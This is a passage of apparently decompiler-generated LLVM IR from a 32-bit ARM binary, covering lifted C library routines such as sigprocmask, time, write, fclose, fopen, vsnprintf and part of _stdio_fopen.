  %v2_120a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_120a4, i32* @r4, align 4
  ret i32 %v0_120a0

; uselistorder directives
  uselistorder i32 %v0_12080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_120a0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120a8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_120a8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_120b05 = load i32, i32* @r4, align 4
  store i32 %v3_120b05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_120d0

bb:                                               ; preds = %entry
  %v3_120b0 = load i32, i32* @r4, align 4
  store i32 %v3_120b0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_120d0, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %bb
  %v0_120bc = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_120c8 = inttoptr i32 %v0_120bc to i32*
  store i32 22, i32* %v2_120c8, align 4
  %v0_120f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120f4

dec_label_pc_120d0:                               ; preds = %.thread, %bb
  %v7_120d0 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_120d0, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_120d0, -4095
  br i1 %tmp13, label %dec_label_pc_120f0, label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120d0
  %v0_120e0 = call i32 @__errno_location()
  %v0_120e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_120e4 = sub i32 0, %v0_120e4
  %v2_120e8 = inttoptr i32 %v0_120e0 to i32*
  store i32 %v1_120e4, i32* %v2_120e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120f0

dec_label_pc_120f0:                               ; preds = %dec_label_pc_120d0, %dec_label_pc_120e0
  %v0_120f0 = phi i32 [ %v7_120d0, %dec_label_pc_120d0 ], [ -1, %dec_label_pc_120e0 ]
  store i32 %v0_120f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_120f0
  %v0_120f4 = phi i32 [ %v0_120f4.pre, %dec_label_pc_120bc ], [ %v0_120f0, %dec_label_pc_120f0 ]
  %v2_120f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_120f8, i32* @r4, align 4
  ret i32 %v0_120f4

; uselistorder directives
  uselistorder i32 %v7_120d0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_120f4, { 1, 0 }
  uselistorder label %dec_label_pc_120f0, { 1, 0 }
  uselistorder label %dec_label_pc_120d0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_120fc = load i32, i32* @r4, align 4
  store i32 %v3_120fc, i32* %stack_var_-8, align 4
  %v2_12100 = call i32 @time(i32* %arg1)
  store i32 %v2_12100, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12100, -4095
  br i1 %tmp, label %dec_label_pc_12120, label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %entry
  %v0_12110 = call i32 @__errno_location()
  %v0_12114 = load i32, i32* %r4.global-to-local, align 4
  %v1_12114 = sub i32 0, %v0_12114
  %v2_12118 = inttoptr i32 %v0_12110 to i32*
  store i32 %v1_12114, i32* %v2_12118, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %entry, %dec_label_pc_12110
  %v0_12120 = phi i32 [ %v2_12100, %entry ], [ -1, %dec_label_pc_12110 ]
  %v2_12124 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12124, i32* @r4, align 4
  ret i32 %v0_12120

; uselistorder directives
  uselistorder i32 %v2_12100, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12120, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1212c = call i32 @wait4()
  ret i32 %v0_1212c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12130 = load i32, i32* @r4, align 4
  store i32 %v3_12130, i32* %stack_var_-8, align 4
  %v3_12134 = load i32, i32* @r2, align 4
  %v4_12134 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_12134)
  store i32 %v4_12134, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12134, -4095
  br i1 %tmp, label %dec_label_pc_12154, label %dec_label_pc_12144

dec_label_pc_12144:                               ; preds = %entry
  %v0_12144 = call i32 @__errno_location()
  %v0_12148 = load i32, i32* %r4.global-to-local, align 4
  %v1_12148 = sub i32 0, %v0_12148
  %v2_1214c = inttoptr i32 %v0_12144 to i32*
  store i32 %v1_12148, i32* %v2_1214c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12154

dec_label_pc_12154:                               ; preds = %entry, %dec_label_pc_12144
  %v0_12154 = phi i32 [ %v4_12134, %entry ], [ -1, %dec_label_pc_12144 ]
  %v2_12158 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12158, i32* @r4, align 4
  ret i32 %v0_12154

; uselistorder directives
  uselistorder i32 %v4_12134, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12154, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12160 = load i32, i32* @global_var_2c58c, align 4
  %v3_12164 = mul i32 %arg1, 2
  %v4_12164 = add i32 %v2_12160, %v3_12164
  %v5_12164 = inttoptr i32 %v4_12164 to i8*
  %v6_12164 = load i8, i8* %v5_12164, align 1
  %v8_12164 = zext i8 %v6_12164 to i32
  %v1_12168 = and i32 %v8_12164, 32
  ret i32 %v1_12168
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1217c = icmp slt i32 %arg1, 0
  br i1 %v1_1217c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_1217c = mul i32 %arg1, 2
  %v2_12188 = load i32, i32* @global_var_2c594, align 4
  %v2_1218c = add i32 %v2_12188, %v2_1217c
  %v3_12190 = inttoptr i32 %v2_1218c to i8*
  %v4_12190 = load i8, i8* %v3_12190, align 1
  %v6_12190 = zext i8 %v4_12190 to i32
  %v1_12194 = add i32 %v2_1218c, 1
  %v2_12194 = inttoptr i32 %v1_12194 to i8*
  %v3_12194 = load i8, i8* %v2_12194, align 1
  %v4_12194 = zext i8 %v3_12194 to i32
  %v3_12198 = mul nuw i32 %v4_12194, 16777216
  %v4_1219c = sdiv i32 %v3_12198, 65536
  %v5_1219c = or i32 %v4_1219c, %v6_12190
  ret i32 %v5_1219c

; uselistorder directives
  uselistorder i32 %v2_1218c, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_32b5c.995 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_121b4 = load i32, i32* @r4, align 4
  store i32 %v3_121b4, i32* %stack_var_-32, align 4
  %v6_121b4 = load i32, i32* @r5, align 4
  %v9_121b4 = load i32, i32* @r6, align 4
  %v12_121b4 = load i32, i32* @r7, align 4
  %v15_121b4 = load i32, i32* @r8, align 4
  %v2_121b8 = add i32 %tmp, 52
  %v3_121b8 = inttoptr i32 %v2_121b8 to i32*
  %v4_121b8 = load i32, i32* %v3_121b8, align 4
  store i32 %v4_121b8, i32* @r8, align 4
  %v2_121bc = add i32 %tmp, 56
  store i32 %v2_121bc, i32* @r5, align 4
  %v2_121c0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_121c4 = icmp eq i32 %v4_121b8, 0
  store i1 %v2_121c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_121d4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_121d4, i32* @r0, align 4
  br i1 %v2_121c4, label %dec_label_pc_121dc, label %dec_label_pc_121f8

dec_label_pc_121dc:                               ; preds = %entry
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_121e4 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r3.global-to-local, align 4
  %v1_121f4 = call i32 @__pthread_return_0()
  %v0_121f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %entry, %dec_label_pc_121dc
  %v0_12200 = phi i32 [ %tmp, %entry ], [ %v0_121f8.pre, %dec_label_pc_121dc ]
  %v1_121f8 = inttoptr i32 %v0_12200 to i8*
  %v2_121f8 = load i8, i8* %v1_121f8, align 1
  %v3_121f8 = zext i8 %v2_121f8 to i32
  %v1_121fc = and i32 %v3_121f8, 64
  store i32 %v1_121fc, i32* %r3.global-to-local, align 4
  %v2_121fc = icmp eq i32 %v1_121fc, 0
  store i1 %v2_121fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_121fc, i32* @r7, align 4
  br i1 %v2_121fc, label %dec_label_pc_12214, label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121f8
  %v3_1220c = call i32 @fflush_unlocked(i8* %v1_121f8)
  store i32 %v3_1220c, i32* @r7, align 4
  %v0_12214.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %dec_label_pc_121f8, %dec_label_pc_1220c
  %v0_12214 = phi i32 [ %v0_12200, %dec_label_pc_121f8 ], [ %v0_12214.pre, %dec_label_pc_1220c ]
  %v1_12214 = add i32 %v0_12214, 4
  %v2_12214 = inttoptr i32 %v1_12214 to i32*
  %v3_12214 = load i32, i32* %v2_12214, align 4
  %v1_12218 = call i32 @__libc_close(i32 %v3_12214)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_12220 = icmp slt i32 %v1_12218, 0
  %v2_12220 = icmp eq i32 %v1_12218, 0
  store i1 %v2_12220, i1* %cpsr_z.global-to-local, align 1
  %v1_12224 = load i32, i32* @r4, align 4
  %v2_12224 = add i32 %v1_12224, 4
  %v3_12224 = inttoptr i32 %v2_12224 to i32*
  store i32 -1, i32* %v3_12224, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  br i1 %v1_12220, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_12214
  %v3_12238 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_12238, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12214, %bb
  %v1_12244 = call i32 @__pthread_return_void()
  %v1_12250 = call i32 @__pthread_return_0()
  %v2_12258 = load i32, i32* @global_var_30928.1003, align 4
  %v1_1225c = add i32 %v2_12258, 1
  store i32 %v1_1225c, i32* %r3.global-to-local, align 4
  store i32 %v1_1225c, i32* @global_var_30928.1003, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  %v1_12274 = call i32 @__pthread_return_void()
  %v0_12278 = load i32, i32* @r4, align 4
  %v1_12278 = inttoptr i32 %v0_12278 to i32*
  %v2_12278 = load i32, i32* %v1_12278, align 4
  %v1_1227c = and i32 %v2_12278, 24576
  store i32 %v1_1227c, i32* %r3.global-to-local, align 4
  %v3_122801 = udiv i32 %v1_1227c, 256
  %v1_12284 = trunc i32 %v3_122801 to i8
  %v3_12284 = add i32 %v0_12278, 1
  %v4_12284 = inttoptr i32 %v3_12284 to i8*
  store i8 %v1_12284, i8* %v4_12284, align 1
  %v0_12288 = load i32, i32* %r3.global-to-local, align 4
  %v1_12288 = trunc i32 %v0_12288 to i8
  %v2_12288 = load i32, i32* @r4, align 4
  %v3_12288 = inttoptr i32 %v2_12288 to i8*
  store i8 %v1_12288, i8* %v3_12288, align 1
  %v0_1228c = load i32, i32* @r4, align 4
  %v1_1228c = inttoptr i32 %v0_1228c to i32*
  %v2_1228c = load i32, i32* %v1_1228c, align 4
  %v1_12290 = or i32 %v2_1228c, 48
  store i32 %v1_12290, i32* %r3.global-to-local, align 4
  %v3_12294 = sdiv i32 %v2_1228c, 256
  %v0_12298 = load i32, i32* @r8, align 4
  %v2_12298 = icmp eq i32 %v0_12298, 0
  store i1 %v2_12298, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_121d4, i32* @r0, align 4
  %v1_122a8 = trunc i32 %v3_12294 to i8
  %v3_122a8 = add i32 %v0_1228c, 1
  %v4_122a8 = inttoptr i32 %v3_122a8 to i8*
  store i8 %v1_122a8, i8* %v4_122a8, align 1
  %v0_122ac = load i32, i32* %r3.global-to-local, align 4
  %v1_122ac = trunc i32 %v0_122ac to i8
  %v2_122ac = load i32, i32* @r4, align 4
  %v3_122ac = inttoptr i32 %v2_122ac to i8*
  store i8 %v1_122ac, i8* %v3_122ac, align 1
  %v0_122b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_122b0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_122b4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_122b8 = load i32, i32* @r4, align 4
  %v1_122b8 = add i32 %v0_122b8, 1
  %v2_122b8 = inttoptr i32 %v1_122b8 to i8*
  %v3_122b8 = load i8, i8* %v2_122b8, align 1
  %v4_122b8 = zext i8 %v3_122b8 to i32
  store i32 %v4_122b8, i32* %r3.global-to-local, align 4
  %v1_122bc = and i32 %v4_122b8, 64
  %v2_122bc = icmp eq i32 %v1_122bc, 0
  store i1 %v2_122bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_122bc, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_122c4 = xor i1 %v2_122bc, true
  call void @__pseudo_cond_branch(i1 %v1_122c4, i32 ptrtoint (i32* @global_var_14ed0.1005 to i32))
  store i32 %v2_121c0, i32* @r0, align 4
  %v1_122d8 = call i32 @__pthread_return_void()
  %v1_122e4 = call i32 @__pthread_return_0()
  %v2_122ec = load i32, i32* @global_var_3092c.1008, align 4
  %v1_122f0 = add i32 %v2_122ec, 1
  store i32 %v1_122f0, i32* %r3.global-to-local, align 4
  store i32 %v2_121c0, i32* @r0, align 4
  store i32 %v1_122f0, i32* @global_var_3092c.1008, align 4
  %v1_12304 = call i32 @__pthread_return_void()
  %v1_12308 = call i32 @_stdio_openlist_dec_use(i32 %v1_12304)
  %v0_1230c = load i32, i32* @r7, align 4
  %v2_12314 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12314, i32* @r4, align 4
  store i32 %v6_121b4, i32* @r5, align 4
  store i32 %v9_121b4, i32* @r6, align 4
  store i32 %v12_121b4, i32* @r7, align 4
  store i32 %v15_121b4, i32* @r8, align 4
  ret i32 %v0_1230c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12214, { 1, 0 }
  uselistorder label %dec_label_pc_121f8, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1233c = call i32 @_stdio_fopen()
  ret i32 %v0_1233c
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12388 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12388, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_1239c = call i32 @__GI_vsnprintf()
  ret i32 %v0_1239c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_123b0 = load i32, i32* @r4, align 4
  %v6_123b0 = load i32, i32* @r5, align 4
  %v12_123b0 = load i32, i32* @r7, align 4
  %v15_123b0 = load i32, i32* @r8, align 4
  %v18_123b0 = load i32, i32* @sl, align 4
  %v0_123b4 = load i32, i32* @r3, align 4
  store i32 %v0_123b4, i32* @r8, align 4
  %v2_123b8 = ptrtoint i32* %stack_var_-108 to i32
  %v0_123c0 = load i32, i32* @r0, align 4
  %v1_123c0 = sub i32 -1, %v0_123c0
  store i32 %v1_123c0, i32* @r5, align 4
  store i32 %v0_123c0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_123d4 = load i32, i32* @r1, align 4
  %v3_123d4 = icmp ult i32 %v1_123c0, %v1_123d4
  br i1 %v3_123d4, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_123d4, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_123dc = load i32, i32* @r2, align 4
  store i32 %v0_123dc, i32* @r7, align 4
  %v2_123e0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_123e0, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_123fc = call i32 @__stdio_init_mutex()
  %v0_12400 = load i32, i32* @r4, align 4
  %v1_12400 = load i32, i32* @r5, align 4
  %v0_12408 = load i32, i32* @r7, align 4
  %v0_1240c = load i32, i32* @r8, align 4
  %v3_1242c = inttoptr i32 %v0_12408 to i8*
  %v4_1242c = call i32 @_vfprintf_internal(i32 %v2_123b8, i8* %v3_1242c, i32 %v0_1240c)
  %v0_12430 = load i32, i32* @r5, align 4
  %v1_12430 = load i32, i32* @sl, align 4
  %v9_12430 = icmp eq i32 %v0_12430, %v1_12430
  br i1 %v9_12430, label %dec_label_pc_12458, label %dec_label_pc_1243c

dec_label_pc_1243c:                               ; preds = %bb23
  %v9_12444 = icmp eq i32 %v1_12400, 0
  %v1_12448 = sext i1 %v9_12444 to i32
  %v1_12448.v0_12424 = add i32 %v0_12400, %v1_12448
  %stack_var_-92.0 = inttoptr i32 %v1_12448.v0_12424 to i8*
  %v1_12454 = trunc i32 %v1_12430 to i8
  store i8 %v1_12454, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_12458

dec_label_pc_12458:                               ; preds = %bb23, %dec_label_pc_1243c
  store i32 %v3_123b0, i32* @r4, align 4
  store i32 %v6_123b0, i32* @r5, align 4
  store i32 %v12_123b0, i32* @r7, align 4
  store i32 %v15_123b0, i32* @r8, align 4
  store i32 %v18_123b0, i32* @sl, align 4
  ret i32 %v4_1242c

; uselistorder directives
  uselistorder i32 %v1_123d4, { 1, 0 }
  uselistorder i32 %v0_123c0, { 1, 0 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12460 = load i32, i32* @r4, align 4
  store i32 %v3_12460, i32* %stack_var_-24, align 4
  %v6_12460 = load i32, i32* @r5, align 4
  %v9_12460 = load i32, i32* @r6, align 4
  %v15_12460 = load i32, i32* @r8, align 4
  %v0_12464 = load i32, i32* @r1, align 4
  %v1_12464 = inttoptr i32 %v0_12464 to i8*
  %v2_12464 = load i8, i8* %v1_12464, align 1
  %v7_12468 = icmp eq i8 %v2_12464, 114
  store i1 %v7_12468, i1* %cpsr_z.global-to-local, align 1
  %v2_1246c = ptrtoint i32* %stack_var_-56 to i32
  %v0_12470 = load i32, i32* @r0, align 4
  store i32 %v0_12470, i32* @r6, align 4
  %v0_12474 = load i32, i32* @r2, align 4
  store i32 %v0_12474, i32* @r8, align 4
  %v0_12478 = load i32, i32* @r3, align 4
  store i32 %v0_12478, i32* @r5, align 4
  br i1 %v7_12468, label %dec_label_pc_124c4, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %entry
  %v7_12480 = icmp eq i8 %v2_12464, 119
  store i1 %v7_12480, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12480, label %bb, label %dec_label_pc_1248c

bb:                                               ; preds = %dec_label_pc_12480
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12480
  %v7_1248c = icmp eq i8 %v2_12464, 97
  store i1 %v7_1248c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1248c, label %bb30, label %dec_label_pc_12498

bb30:                                             ; preds = %dec_label_pc_1248c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_12498:                               ; preds = %dec_label_pc_1248c, %dec_label_pc_12550, %dec_label_pc_12524
  %v0_12498 = call i32 @__errno_location()
  store i32 %v0_12498, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_124a0 = load i32, i32* @r8, align 4
  %v2_124a0 = icmp eq i32 %v0_124a0, 0
  store i1 %v2_124a0, i1* %cpsr_z.global-to-local, align 1
  %v2_124a4 = inttoptr i32 %v0_12498 to i32*
  store i32 22, i32* %v2_124a4, align 4
  br i1 %v2_124a0, label %dec_label_pc_12718, label %dec_label_pc_124ac

dec_label_pc_124ac:                               ; preds = %dec_label_pc_12574._crit_edge, %dec_label_pc_12498
  %v0_124ac = load i32, i32* @r8, align 4
  %v1_124ac = add i32 %v0_124ac, 1
  %v2_124ac = inttoptr i32 %v1_124ac to i8*
  %v3_124ac = load i8, i8* %v2_124ac, align 1
  %v4_124ac = zext i8 %v3_124ac to i32
  store i32 %v4_124ac, i32* %r3.global-to-local, align 4
  %v1_124b0 = and i32 %v4_124ac, 32
  %v2_124b0 = icmp eq i32 %v1_124b0, 0
  store i1 %v2_124b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124b0, label %dec_label_pc_12718, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %dec_label_pc_124ac
  store i32 %v0_124ac, i32* @r0, align 4
  %v0_124bc = call i32 @free()
  store i32 %v0_124bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12718

dec_label_pc_124c4:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %bb, %bb30, %dec_label_pc_124c4
  %v1_124e0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_124c4 ]
  %v1_124c8 = add i32 %v0_12464, 1
  %v2_124c8 = inttoptr i32 %v1_124c8 to i8*
  %v3_124c8 = load i8, i8* %v2_124c8, align 1
  %v7_124cc = icmp eq i8 %v3_124c8, 98
  store i1 %v7_124cc, i1* %cpsr_z.global-to-local, align 1
  %v1_124c8.v0_12464 = select i1 %v7_124cc, i32 %v1_124c8, i32 %v0_12464
  store i32 %v1_124c8.v0_12464, i32* %r3.global-to-local, align 4
  %v1_124d8 = add i32 %v1_124c8.v0_12464, 1
  %v2_124d8 = inttoptr i32 %v1_124d8 to i8*
  %v3_124d8 = load i8, i8* %v2_124d8, align 1
  %v4_124d8 = zext i8 %v3_124d8 to i32
  store i32 %v4_124d8, i32* %r3.global-to-local, align 4
  %v7_124dc = icmp eq i8 %v3_124d8, 43
  store i1 %v7_124dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_124dc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_124c8
  store i32 %v1_124e0, i32* %r3.global-to-local, align 4
  %v2_124e4 = add nuw nsw i32 %v1_124e0, 1
  store i32 %v2_124e4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_124c8, %bb33
  %v2_124e8 = icmp eq i32 %v0_12474, 0
  store i1 %v2_124e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_124e8, label %dec_label_pc_124f0, label %dec_label_pc_1251c

dec_label_pc_124f0:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_124f4 = call i32 @malloc(i32 80)
  store i32 %v1_124f4, i32* %r0.global-to-local, align 4
  store i32 %v1_124f4, i32* @r8, align 4
  %v3_124f8 = icmp eq i32 %v1_124f4, 0
  store i1 %v3_124f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_124f8, label %dec_label_pc_1271c, label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_124f0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_12508 = add i32 %v1_124f4, 1
  %v4_12508 = inttoptr i32 %v3_12508 to i8*
  store i8 32, i8* %v4_12508, align 1
  %v0_1250c = load i32, i32* %r2.global-to-local, align 4
  %v1_1250c = load i32, i32* @r8, align 4
  %v2_1250c = add i32 %v1_1250c, 8
  %v3_1250c = inttoptr i32 %v2_1250c to i32*
  store i32 %v0_1250c, i32* %v3_1250c, align 4
  %v0_12510 = load i32, i32* %r2.global-to-local, align 4
  %v1_12510 = trunc i32 %v0_12510 to i8
  %v2_12510 = load i32, i32* @r8, align 4
  %v3_12510 = inttoptr i32 %v2_12510 to i8*
  store i8 %v1_12510, i8* %v3_12510, align 1
  %v0_12514 = load i32, i32* @r8, align 4
  %v1_12514 = add i32 %v0_12514, 56
  store i32 %v1_12514, i32* @r0, align 4
  %v0_12518 = call i32 @__stdio_init_mutex()
  store i32 %v0_12518, i32* %r0.global-to-local, align 4
  %v0_1251c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1251c

dec_label_pc_1251c:                               ; preds = %.thread4, %dec_label_pc_12500
  %v0_12574 = phi i32 [ %v0_12478, %.thread4 ], [ %v0_1251c.pre, %dec_label_pc_12500 ]
  %v1_1251c = icmp slt i32 %v0_12574, 0
  %v2_1251c = icmp eq i32 %v0_12574, 0
  store i1 %v2_1251c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1251c, label %dec_label_pc_12574, label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %dec_label_pc_1251c
  %v0_12528 = load i32, i32* @r4, align 4
  %v2_12528 = and i32 %v0_12528, ptrtoint ([131 x i8]* @global_var_20003.1012 to i32)
  %v1_1252c = or i32 %v2_12528, 1
  store i32 %v1_1252c, i32* %r2.global-to-local, align 4
  %v0_12530 = load i32, i32* @r6, align 4
  %v1_12530 = add i32 %v0_12530, 1
  %v2_12534 = and i32 %v1_12530, %v1_1252c
  store i32 %v2_12534, i32* %r3.global-to-local, align 4
  %v9_12538 = icmp eq i32 %v2_12534, %v1_1252c
  store i1 %v9_12538, i1* %cpsr_z.global-to-local, align 1
  %v1_1253c = load i32, i32* @r8, align 4
  %v2_1253c = add i32 %v1_1253c, 4
  %v3_1253c = inttoptr i32 %v2_1253c to i32*
  store i32 %v0_12574, i32* %v3_1253c, align 4
  br i1 %v9_12538, label %dec_label_pc_12544, label %dec_label_pc_12498

dec_label_pc_12544:                               ; preds = %dec_label_pc_12524
  %v0_12544 = load i32, i32* @r4, align 4
  %v1_12544 = load i32, i32* @r6, align 4
  %v2_12544 = sub i32 -1, %v1_12544
  %v3_12544 = and i32 %v0_12544, %v2_12544
  store i32 %v3_12544, i32* %r3.global-to-local, align 4
  %v1_12548 = and i32 %v3_12544, 1024
  %v2_12548 = icmp eq i32 %v1_12548, 0
  store i1 %v2_12548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12548, label %dec_label_pc_12568, label %dec_label_pc_12550

dec_label_pc_12550:                               ; preds = %dec_label_pc_12544
  %v0_12550 = load i32, i32* @r5, align 4
  store i32 %v0_12550, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_1255c = call i32 @__libc_fcntl(i32 %v0_12550, i32 4)
  store i32 %v2_1255c, i32* %r0.global-to-local, align 4
  %v2_12560 = icmp eq i32 %v2_1255c, 0
  store i1 %v2_12560, i1* %cpsr_z.global-to-local, align 1
